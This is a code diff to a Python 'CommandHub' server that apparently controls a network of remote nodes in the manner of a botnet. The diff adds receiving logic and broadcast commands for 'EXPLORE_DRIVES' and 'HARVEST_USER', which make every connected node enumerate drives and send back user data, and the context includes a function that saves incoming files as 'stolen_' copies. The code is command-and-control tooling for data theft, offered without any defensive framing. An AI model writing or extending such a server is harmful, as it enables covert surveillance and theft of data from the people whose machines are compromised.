@@ -1,4 +1,4 @@
-﻿import argparse
+import argparse
 import json
 import socket
 import threading
@@ -46,37 +46,79 @@ class CommandHub:
             thread.start()
 
     def handle_node(self, conn: socket.socket, addr: Tuple[str, int]) -> None:
+        mode = 'text'
+        expecting_size = None
         try:
             while self.running:
-                try:
-                    data = conn.recv(4096).decode('utf-8', errors='ignore')
-                except socket.timeout:
-                    continue
-                except (ConnectionResetError, BrokenPipeError):
-                    break
-
-                if not data:
-                    break
-
-                for message in data.strip().splitlines():
-                    message = message.strip()
-                    if not message:
+                if mode == 'text':
+                    try:
+                        data = conn.recv(4096).decode('utf-8', errors='ignore')
+                    except socket.timeout:
                         continue
-                    if message.startswith("STATUS:"):
-                        status_json = message[7:]
+                    except (ConnectionResetError, BrokenPipeError):
+                        break
+                    if not data:
+                        break
+                    for message in data.strip().splitlines():
+                        message = message.strip()
+                        if not message:
+                            continue
+                        if message.startswith("STATUS:"):
+                            status_json = message[7:]
+                            try:
+                                status = json.loads(status_json)
+                                node_id = self.node_id_map.get(addr)
+                                with self.lock:
+                                    if node_id:
+                                        self.node_status[node_id] = status
+                                    else:
+                                        self.node_status[str(addr)] = status
+                                print(f"[*] Status from {addr} ({node_id}): {status}")
+                            except json.JSONDecodeError:
+                                print(f"[!] Invalid status from {addr}: {status_json}")
+                        elif message.startswith("EXPLORE_SIZE"):
+                            try:
+                                size = int(message.split()[1])
+                                expecting_size = ('explore', size)
+                                mode = 'binary'
+                                break
+                            except (ValueError, IndexError):
+                                print(f"[!] Invalid EXPLORE_SIZE from {addr}: {message}")
+                        elif message.startswith("HARVEST_SIZE"):
+                            try:
+                                size = int(message.split()[1])
+                                expecting_size = ('harvest', size)
+                                mode = 'binary'
+                                break
+                            except (ValueError, IndexError):
+                                print(f"[!] Invalid HARVEST_SIZE from {addr}: {message}")
+                        else:
+                            print(f"[?] Unknown message from {addr}: {message}")
+                elif mode == 'binary':
+                    data = b''
+                    remaining = expecting_size[1]
+                    while remaining > 0:
                         try:
-                            status = json.loads(status_json)
+                            chunk = conn.recv(min(4096, remaining))
+                            if not chunk:
+                                break
+                            data += chunk
+                            remaining -= len(chunk)
+                        except socket.timeout:
+                            continue
+                    if len(data) == expecting_size[1]:
+                        report = data.decode('utf-8', errors='ignore')
+                        try:
+                            parsed = json.loads(report)
                             node_id = self.node_id_map.get(addr)
-                            with self.lock:
-                                if node_id:
-                                    self.node_status[node_id] = status
-                                else:
-                                    self.node_status[str(addr)] = status
-                            print(f"[*] Status from {addr} ({node_id}): {status}")
+                            if expecting_size[0] == 'explore':
+                                print(f"[*] Explore drives from {addr} ({node_id}): {parsed}")
+                            elif expecting_size[0] == 'harvest':
+                                print(f"[*] Harvest user from {addr} ({node_id}): {parsed}")
                         except json.JSONDecodeError:
-                            print(f"[!] Invalid status from {addr}: {status_json}")
-                    else:
-                        print(f"[?] Unknown message from {addr}: {message}")
+                            print(f"[!] Invalid {expecting_size[0]} report from {addr}")
+                    mode = 'text'
+                    expecting_size = None
         finally:
             self.remove_node(addr)
 
@@ -188,6 +230,8 @@ class CommandHub:
             "  broadcast STATUS_REPORT Ask all nodes for a status update\n"
             "  broadcast SHUTDOWN_NODE Tell all nodes to disconnect\n"
             "  broadcast PING         Send a ping to all nodes\n"
+            "  broadcast EXPLORE_DRIVES Ask all nodes to explore drives\n"
+            "  broadcast HARVEST_USER   Ask all nodes to harvest user data\n"
             "  send <node-id|host:port> <COMMAND> Send a command to a single node\n"
             "  quit                    Stop the hub\n"
         )
@@ -243,6 +287,7 @@ if __name__ == '__main__':
 
     hub = CommandHub(host=args.host, port=args.port)
     hub.start()
+
 def save_exfiltrated_file(conn, filename):
     # Receive the size first
     header = conn.recv(1024).decode()
@@ -258,3 +303,4 @@ def save_exfiltrated_file(conn, filename):
                 f.write(chunk)
                 remaining -= len(chunk)
         print(f"[+] {filename} saved as stolen_{filename}")
+
